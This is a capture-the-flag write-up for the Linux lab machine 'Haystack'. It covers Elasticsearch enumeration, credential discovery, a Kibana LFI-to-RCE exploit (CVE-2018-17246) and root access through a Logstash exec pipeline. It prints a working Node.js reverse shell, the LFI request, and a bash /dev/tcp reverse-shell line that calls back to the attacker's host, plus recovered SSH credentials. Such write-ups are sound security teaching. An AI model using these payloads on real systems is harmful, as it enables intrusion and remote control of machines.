# Haystack
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Web Service Enumeration | Found `nginx` on port 80 and `nginx` on port 9200. Port 80 displayed a static image, while port 9200 returned a `502 Bad Gateway` error, suggesting a proxy to another service like Elasticsearch. |
| 2 | (Local) | Elasticsearch Index Enumeration & Data Exfiltration | Enumerated the Elasticsearch indices on port 9200. Found `quotes` and `bank` indices. Dumped all documents from the `quotes` index, which contained quotes in Spanish. |
| 3 | `security` | Credential Discovery & SSH Login (User Flag) | Translated the Spanish quotes and found a Base64-encoded username and password: `user: security` and `pass: spanish.is.key`. Used these credentials to log in via SSH as the `security` user. |
| 4 | `kibana` | Kibana RCE via LFI | Used port forwarding via SSH to access the Kibana web interface running locally on port 5601. Discovered Kibana version 6.4.2 was running, which is vulnerable to an LFI leading to RCE (CVE-2018-17246). Created a malicious Node.js reverse shell payload, placed it in `/tmp/shell.js`, and used the LFI to execute it, gaining a shell as the `kibana` user. |
| 5 | `root` | Logstash RCE via Malicious Log File | Found a Logstash configuration file in `/etc/logstash/conf.d/` that was processing log files in `/opt/kibana/` and executing commands from them. Created a new log file `/opt/kibana/logstash_root` with a payload matching the `grok` filter (`Ejecutar comando : <command>`). The log file contained a reverse shell payload, which Logstash executed as the root user, granting a root shell. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
Nmap scan report for 10.10.10.115
Host is up (0.083s latency).
Not shown: 993 filtered tcp ports (no-response), 4 filtered tcp ports (host-prohibited)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
80/tcp   open  http    nginx 1.12.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.12.2
9200/tcp open  http    nginx 1.12.2
|_http-title: 502 Bad Gateway
|_http-server-header: nginx/1.12.2
```
If we dig into port 80, we can see that we cannot see anything relevant, just an image showing a needle in a haystack.  
If we try to download this image and execute exiftool aganist it we do not see any relevant information, so we can proceed with port 9200.  
As soon as we open port 9200 we can see elasticsearch service configured.  
In order to enumerate elasticsearch and probe indices, we can go over [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch).  
As we can see here, to enumerate indices we can perform the following request:
```
[root@kali Haystack ]$ curl -s http://$TARGET:9200/_cat/indices                                              
green  open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    1 0     4kb     4kb
yellow open quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb
yellow open bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
```
Also according to [book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch) for elasticsearch we can enumerate the indexes using the following query:
```
[root@kali Haystack ]$ curl -s http://$TARGET:9200/bank/_search\?size\=1000 | jq '.hits .hits[] ._source .email'
[... SNIP ...]
"virginiaayala@filodyne.com"
"aureliaharding@orbalix.com"
"ratliffheath@zappix.com"
"lavernejohnson@senmei.com"
"effiegates@digitalus.com"
"rowenawilkinson@asimiline.com"
"hudsonenglish@xinware.com"
"blakedavidson@quantasis.com"
"garciahess@quiltigen.com"
"rachellerice@enaut.com"
[... SNIP ...]
```
So, at this point we may notice that there is a field called "total" inside "hits" that indicates that 1000 documents were found inside this index but only 10 were retried. This is because by default there is a limit of 10 documents.  
But, now that you know that this index contains 1000 documents, you can dump all of them indicating the number of entries you want to dump in the size parameter.  
Now let's enumerate the quote index.  

## User
Using the previous method to enumerate elastic for the quote index, we can see that the index is filled with Spanish quotes, so before starting let's translate them.  
To do so, let's build the following python script:  
```
import requests, json
from deep_translator import GoogleTranslator

r=requests.get('http://10.10.10.115:9200/quotes/_search?size=253');
quotes=json.loads(r.text)

for i in range(0, len(quotes['hits']['hits'])):
    q=quotes['hits']['hits'][i]
    t=q['_source']['quote']
    translation = GoogleTranslator(source='auto', target='en').translate(t)
    print(translation)
```
now that we have all the quotes translated we can search in the output for keywords that may represent any credential to access this box like secret, key,password, passwd and so on.  
we can find the following:  
```
I have to save the key for the machine: dXNlcjogc2VjdXJpdHkg   
This key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
```  
Let's base64 decode:  
```
[root@kali Haystack ]$ echo "dXNlcjogc2VjdXJpdHkg" | base64 -d
user: security #    
[root@kali Haystack ]$ echo "cGFzczogc3BhbmlzaC5pcy5rZXk=" | base64 -d
pass: spanish.is.key#  
```
now, if we try this user/pass combination with SSH service (the only service that is exposing a login) we can login as user security:
```
[root@kali Haystack ]$ ssh $TARGET -l security                    
security@10.10.10.115's password:
Last login: Fri Feb 18 12:03:21 2022 from 10.10.14.24
[security@haystack ~]$
```

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS we can notice that a java process (logstash) is running as root:
```
╔══════════╣ Cleaned processes                                                                                                                                                                                                               
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                       
root          1  0.0  0.1 128028  6572 ?        Ss   10:58   0:05 /usr/lib/systemd/systemd --switched-root --system --deserialize 22                                                                                                         
root       3086  0.0  0.1  40232  4444 ?        Ss   10:58   0:01 /usr/lib/systemd/systemd-journald                                                                                                                                          
root       3103  0.0  0.2 127348  7956 ?        Ss   10:58   0:00 /usr/sbin/lvmetad -f                                                                                                                                                       
root       3116  0.0  0.1  48076  5560 ?        Ss   10:58   0:01 /usr/lib/systemd/systemd-udevd                                                                                                                                             
root       6233  0.0  0.0  62044  1088 ?        S<sl 10:59   0:00 /sbin/auditd                                                                                                                                                               
root       6390  0.0  0.0  26376  1756 ?        Ss   10:59   0:00 /usr/lib/systemd/systemd-logind                                                                                                                                            
kibana     6391  0.4  5.4 1349780 212204 ?      Ssl  10:59   1:58 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml                                                                                                                                                                              
root       6392  0.8 12.5 2724036 483456 ?      SNsl 10:59   4:08 /bin/java -Xms500m -Xmx500m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:CMSInitiatingOccupancyFraction=75 -XX:+UseCMSInitiatingOccupancyOnly -Djava.awt.headless=true -Dfi
le.encoding=UTF-8 -Djruby.compile.invokedynamic=true -Djruby.jit.threshold=0 -XX:+HeapDumpOnOutOfMemoryError -Djava.security.egd=file:/dev/urandom -cp /usr/share/logstash/logstash-core/lib/jars/animal-sniffer-annotations-1.14.jar:/usr/sh
are/logstash/logstash-core/lib/jars/commons-codec-1.11.jar:/usr/share/logstash/logstash-core/lib/jars/commons-compiler-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/error_prone_annotations-2.0.18.jar:/usr/share/logstash/logstash-c
ore/lib/jars/google-java-format-1.1.jar:/usr/share/logstash/logstash-core/lib/jars/gradle-license-report-0.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/guava-22.0.jar:/usr/share/logstash/logstash-core/lib/jars/j2objc-annotations-1.
1.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-annotations-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-core-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/jackson-databind-2.9.5.jar:/usr/share/logstash/lo
gstash-core/lib/jars/jackson-dataformat-cbor-2.9.5.jar:/usr/share/logstash/logstash-core/lib/jars/janino-3.0.8.jar:/usr/share/logstash/logstash-core/lib/jars/jruby-complete-9.1.13.0.jar:/usr/share/logstash/logstash-core/lib/jars/jsr305-1
.3.9.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-api-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-core-2.9.1.jar:/usr/share/logstash/logstash-core/lib/jars/log4j-slf4j-impl-2.9.1.jar:/usr/share/logstash/logstash-co
re/lib/jars/logstash-core.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.commands-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.contenttype-3.4.100.jar:/usr/share/logstash/logstash-core/lib/jars/o
rg.eclipse.core.expressions-3.4.300.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.filesystem-1.3.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.jobs-3.5.100.jar:/usr/share/logstash/logstash-core/lib
/jars/org.eclipse.core.resources-3.7.100.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.core.runtime-3.7.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.app-1.3.100.jar:/usr/share/logstash/logstash-core/l
ib/jars/org.eclipse.equinox.common-3.6.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.preferences-3.4.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.equinox.registry-3.5.101.jar:/usr/share/logstash/log
stash-core/lib/jars/org.eclipse.jdt.core-3.10.0.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.osgi-3.7.1.jar:/usr/share/logstash/logstash-core/lib/jars/org.eclipse.text-3.5.101.jar:/usr/share/logstash/logstash-core/lib/jars/
slf4j-api-1.7.25.jar org.logstash.Logstash --path.settings /etc/logstash       
[... SNIP ...]
```
Let's look at logstash configuration files and see if we can edit something and trigger a root shell.  
```
[security@haystack logstash]$ ls -la
total 52
drwxr-xr-x.  3 root   root    183 Jun 18  2019 .
drwxr-xr-x. 85 root   root   8192 Aug 27  2019 ..
drwxrwxr-x.  2 root   kibana   62 Jun 24  2019 conf.d
-rw-r--r--.  1 root   kibana 1850 Nov 28  2018 jvm.options
-rw-r--r--.  1 root   kibana 4466 Sep 26  2018 log4j2.properties
-rw-r--r--.  1 root   kibana  342 Sep 26  2018 logstash-sample.conf
-rw-r--r--.  1 root   kibana 8192 Jan 23  2019 logstash.yml
-rw-r--r--.  1 root   kibana 8164 Sep 26  2018 logstash.yml.rpmnew
-rw-r--r--.  1 root   kibana  285 Sep 26  2018 pipelines.yml
-rw-------.  1 kibana kibana 1725 Dec 10  2018 startup.options
```
as we can see all the logstash's configuration files are owned by root:kibana, especially the conf.d folder that may contain vulnerable user defined rules.  
So if we want to have a chance to take a look at this conf we will need to pivot our access to kibana user and hopefully root.  
As defined in [book.hacktricks.xyz for kibana](https://book.hacktricks.xyz/pentesting/5601-pentesting-kibana) there is an RCE vulnerability for kibana<6.6.0.  
So let's check how to examine the kibana version.  
According to [this source](https://kb.objectrocket.com/elasticsearch/how-to-check-your-elasticsearch-version-from-kibana) to enumerate kibana version, all we have to do is to perform a GET / request using kibana dev tools.  
To access kibana dev tools we need to perform a local port forwarding.  
We have two ways: use ```ssh -D 18567 -N -f security@$TARGET``` and use foxyproxy op port 18567. Or alternatively configure port forwarding with ```~C``` (this has to be the first character we type).
```
[security@haystack logstash]$
ssh> -L 5602:127.0.0.1:5601
Forwarding port.
```
And access kibana via our localhost on port 5602.
Once we open kibana we can go to Dev Tolls and type ```GET /``` and in the response we will see the following:  
```
{
  "name": "iQEYHgS",
  "cluster_name": "elasticsearch",
  "cluster_uuid": "pjrX7V_gSFmJY-DxP4tCQg",
  "version": {
    "number": "6.4.2",
    "build_flavor": "default",
    "build_type": "rpm",
    "build_hash": "04711c2",
    "build_date": "2018-09-26T13:34:09.098244Z",
    "build_snapshot": false,
    "lucene_version": "7.4.0",
    "minimum_wire_compatibility_version": "5.6.0",
    "minimum_index_compatibility_version": "5.0.0"
  },
  "tagline": "You Know, for Search"
}
```
As we can se we are running version 6.4.2 so, there is a chance that kibana is vulnerable to RCE.
Now, we can follow [this kibana vulnerability PoC](https://github.com/mpgn/CVE-2018-17246) and put the following file under /tmp/shell.sh
```
[security@haystack tmp]$ cat shell.js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1337, "10.10.14.24", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
Then since this vulnerability exploit an LFI, we will need to call the following url using curl:
```
[security@haystack tmp]$ curl 'http://localhost:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/shell.js'
```
listen on port 1337, and we get a shell as kibana user
```
root@kali:~/Documents/HTB/Boxes/Haystack# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.115] 54658
id
uid=994(kibana) gid=992(kibana) grupos=992(kibana) contexto=system_u:system_r:unconfined_service_t:s0
```
Now that we have kibana access rights, let's look straight into /etc/logstash/conf.d/ folder.  
If we examine the files, we can see that the following pipeline is configured:  
```
bash-4.2$ cat *
filter {
        if [type] == "execute" {
                grok {
                        match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
input {
        file {
                path => "/opt/kibana/logstash_*"
                start_position => "beginning"
                sincedb_path => "/dev/null"
                stat_interval => "10 second"
                type => "execute"
                mode => "read"
        }
}
output {
        if [type] == "execute" {
                stdout { codec => json }
                exec {
                        command => "%{comando} &"
                }
        }
}
```
so it seems like there is an input for logs and a filter that if matched, we can execute commands.  
so now we can create a file containing the below:
```
Ejecutar comando : bash -i >& /dev/tcp/10.10.14.24/4444 0>&1
```
for matching the correct regex, as always, we cannot leave anything at the case, and we need to look at the elastic documentation for the meaning of the syntax of ```%{GREEDYDATA:comando}```.  
essentially logstash is getting data from /opt/kibana/logstash_* and matching lines like ```Ejecutar comando : touch /tmp/helo``` putting into the variable comando the value of the data in the place where the regex is defined.  
GREEDYDATA actually is grok syntax for *. more information can be found [here](https://logz.io/blog/logstash-grok/).  
To check if we are matching the grok filter or not, we can use [this online tool](https://grokdebug.herokuapp.com/).
now we can create a file, for example /opt/kibana/logstash_b0d put inside the above payload, and wait to get a root shell.  
```
root@kali:~/Documents/HTB/Boxes/Haystack# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.10.115] 47010
bash: no hay control de trabajos en este shell
[root@haystack /]# 
```
